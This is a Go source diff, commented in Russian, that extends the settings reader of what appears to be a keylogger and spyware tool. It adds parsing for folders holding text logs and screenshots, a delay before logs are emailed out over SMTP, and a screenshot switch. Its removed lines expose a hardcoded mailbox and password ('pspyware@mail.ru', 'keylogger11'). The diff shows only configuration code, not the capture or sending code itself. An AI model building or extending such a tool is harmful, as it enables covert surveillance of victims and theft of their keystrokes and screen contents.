@@ -23,6 +23,8 @@ var sbj string
 var body string
 var fld_key string
 var fld_scr string
+var email_relay int
+var is_scr bool
 func main() {
 
 file, _ := os.Open("config") //имя файла, откуда читаем настройки
@@ -31,7 +33,7 @@ f := bufio.NewReader(file)
 fmt.Println("\nВаши настройки:")
 settings, _ := f.ReadString(0)
 fmt.Print(settings)
-arr := strings.Split(settings, "\n")
+arr := strings.Split(settings, "\n")		// Массив с настройками,типа [set:val]...
 fmt.Print("\n")
 
 email := strings.Split(arr[0], ":") 		// Email login
@@ -40,12 +42,17 @@ server := strings.Split(arr[2], ":")		// SMTP-сервер
 port_str := strings.Split(arr[3], ":")		// SMTP-порт
 port := port_str[1]				// SMTP-порт - адский конверт в int
 port_int, _ := strconv.ParseInt(port, 10, 0)	// SMTP-порт - адский конверт в int
-port_int1 = int(port_int)			// SMTP-порт - адский конверт в int
+port_int1 = int(port_int)			// !SMTP-порт - адский конверт в int
 to := strings.Split(arr[4], ":")		// E-mail получателя
 sbj := strings.Split(arr[5], ":")		// Тема письма
 body := strings.Split(arr[6], ":")		// Тело письма
-fld_key := strings.Split(arr[7], ":")		// Тема письма
-fld_scr := strings.Split(arr[8], ":")		// Тело письма
+fld_key := strings.Split(arr[7], ":")		// Папка хранения текстовых логов
+fld_scr := strings.Split(arr[8], ":")		// Папка хранения скриншотов
+email_relay := strings.Split(arr[9], ":")	// Задержка отправки почты в секундах, по умолчанию 14400
+email_relay_int1 := email_relay[1]		// Задержка отправки почты в секундах - адский конверт в int
+email_relay_int2, _ := strconv.ParseInt(email_relay_int1, 10, 0) // Задержка отправки почты в секундах - адский конверт в int
+email_relay_int = int(email_relay_int2)		// !Задержка отправки почты в секундах - адский конверт в int
+is_scr := strings.Split(arr[10], ":")		// Делать ли скриншоты - если 1 - да, 0 - нет
 defer file.Close()
 
 /* const (
@@ -55,10 +62,7 @@ defer file.Close()
 	savePhotoInterval = 10
 	// Send email interval.
 	sendEmailInterval = 15
-	
-	emailLogin = "pspyware@mail.ru"
-	
-	emailPass = "keylogger11"
+
 	// Need to save screen shots?
 	isScreenShot = true
 )
